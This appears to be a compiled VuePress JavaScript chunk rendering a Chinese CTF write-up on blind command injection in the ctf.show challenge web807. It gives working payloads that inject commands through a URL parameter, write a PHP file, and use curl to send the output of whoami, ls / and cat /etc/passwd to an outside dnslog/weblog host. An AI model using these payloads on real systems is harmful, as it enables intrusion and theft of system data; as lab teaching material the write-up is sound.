(window.webpackJsonp=window.webpackJsonp||[]).push([[64],{427:function(s,e,a){"use strict";a.r(e);var t=a(11),r=Object(t.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("p",[s._v("题目存在RCE命令执行，使用了"),e("code",[s._v("exec")]),s._v("、"),e("code",[s._v("shell_exec")]),s._v("，反引号等执行命令，但是页面不会显示执行结果，这种情况称为无回显RCE。")]),s._v(" "),e("p",[s._v("解决方法：")]),s._v(" "),e("ul",[e("li",[s._v("尝试写文件，如木马webshell")]),s._v(" "),e("li",[s._v("尝试curl命令发起http请求，dnslog外带出结果")]),s._v(" "),e("li",[s._v("反弹shell")]),s._v(" "),e("li",[s._v("如果有wget命令，可以在远程服务器上写一个webshell，wget下载到靶机上")]),s._v(" "),e("li",[s._v("不出网且不能写文件时，可以考虑时间盲注")])]),s._v(" "),e("p",[s._v("推荐写文件、dnslog、weblog外带，简单便捷零成本，即开即用。")]),s._v(" "),e("p",[s._v("举例，以题目"),e("a",{attrs:{href:"https://ctf.show/challenges#web807-1847",target:"_blank",rel:"noopener noreferrer"}},[s._v("web807"),e("OutboundLink")],1),s._v("举例：")]),s._v(" "),e("p",[s._v("题目这里shell_exec会对于用户传入的url进行访问，没有任何过滤，可以在shell_exec函数里使用分号执行多个命令")]),s._v(" "),e("p",[e("img",{attrs:{src:"/medias/rce-weblog/1.png",alt:"1"}})]),s._v(" "),e("h2",{attrs:{id:"写文件"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#写文件"}},[s._v("#")]),s._v(" 写文件")]),s._v(" "),e("p",[s._v("使用echo命令搭配重定向符，把输出内容写入文件中")]),s._v(" "),e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"<?php phpinfo(); ?>"')]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".php\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("payload：")]),s._v(" "),e("div",{staticClass:"language-plaintext line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plaintext"}},[e("code",[s._v('url=https://127.0.0.1/;echo "<?php phpinfo(); ?>" > 1.php\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("访问1.php，发现没有这个文件，这道题可能没有写的权限。")]),s._v(" "),e("h2",{attrs:{id:"使用curl发起http请求-dnslog-weblog"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#使用curl发起http请求-dnslog-weblog"}},[s._v("#")]),s._v(" 使用curl发起http请求(dnslog/weblog)")]),s._v(" "),e("p",[s._v("推荐一个"),e("a",{attrs:{href:"https://eyes.sh/dns/",target:"_blank",rel:"noopener noreferrer"}},[s._v("dnslog"),e("OutboundLink")],1),s._v("平台，免费好用无需注册")]),s._v(" "),e("p",[s._v("使用反引号获取命令执行结果作为子域名，带出命令执行结果")]),s._v(" "),e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"https://'),e("span",{pre:!0,attrs:{class:"token variable"}},[e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v('.example.com"')]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("在"),e("a",{attrs:{href:"https://eyes.sh/dns/",target:"_blank",rel:"noopener noreferrer"}},[s._v("dnslog"),e("OutboundLink")],1),s._v("获取一个平台分配的子域名，替换上面的域名")]),s._v(" "),e("p",[e("img",{attrs:{src:"/medias/rce-weblog/2.png",alt:"2"}})]),s._v(" "),e("p",[s._v("dnslog payload：")]),s._v(" "),e("div",{staticClass:"language-plaintext line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plaintext"}},[e("code",[s._v("url=https://127.0.0.1/;curl http://`whoami`.enwvbm6o.eyes.sh\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("提交payload可以看到子域名命令包含命令执行结果"),e("code",[s._v("www-data")])]),s._v(" "),e("p",[e("img",{attrs:{src:"/medias/rce-weblog/3.png",alt:"3"}})]),s._v(" "),e("p",[s._v("dnslog有什么缺陷？")]),s._v(" "),e("p",[s._v("尝试把"),e("code",[s._v("whoami")]),s._v("替换成其他命令，如"),e("code",[s._v("ls /")]),s._v(","),e("code",[s._v("cat /etc/passwd")])]),s._v(" "),e("p",[s._v("可以发现，dnslog子域名在遇到空格时，就断了，拿到的结果太短")]),s._v(" "),e("p",[e("img",{attrs:{src:"/medias/rce-weblog/4.png",alt:"4"}})]),s._v(" "),e("p",[s._v("引出weblog的使用，weblog会记录完整的get请求，post请求，但是get请求下，命令执行结果函数有空格或换行时，还是会截断，因此更推荐使用post请求，拿到完整的命令执行结果。")]),s._v(" "),e("p",[s._v("把命令执行结果作为get请求的参数带出，get请求的payload：")]),s._v(" "),e("div",{staticClass:"language-plaintext line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plaintext"}},[e("code",[s._v("url=https://127.0.0.1;curl http://enwvbm6o.eyes.sh/?1=`ls /`\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("注意这个weblog平台要用http。发现get请求还是会被空格、换行截断")]),s._v(" "),e("p",[e("img",{attrs:{src:"/medias/rce-weblog/5.png",alt:"5"}})]),s._v(" "),e("p",[s._v("尝试使用curl发起post请求")]),s._v(" "),e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-X")]),s._v(" POST "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-d")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1='),e("span",{pre:!0,attrs:{class:"token variable"}},[e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" /"),e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v('"')]),s._v(" http://enwvbm6o.eyes.sh/\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("weblog payload：")]),s._v(" "),e("div",{staticClass:"language-plaintext line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plaintext"}},[e("code",[s._v('url=https://127.0.0.1;curl -X POST -d "1=`ls /`" http://enwvbm6o.eyes.sh/\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("可以看到拿到了完整的命令执行结果")]),s._v(" "),e("p",[e("img",{attrs:{src:"/medias/rce-weblog/6.png",alt:"6"}})]),s._v(" "),e("p",[s._v("weblog payload：")]),s._v(" "),e("div",{staticClass:"language-plaintext line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plaintext"}},[e("code",[s._v('url=https://127.0.0.1;curl -X POST -d "1=`cat /etc/passwd`" http://enwvbm6o.eyes.sh/\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:"/medias/rce-weblog/7.png",alt:"7"}})])])}),[],!1,null,null,null);e.default=r.exports}}]);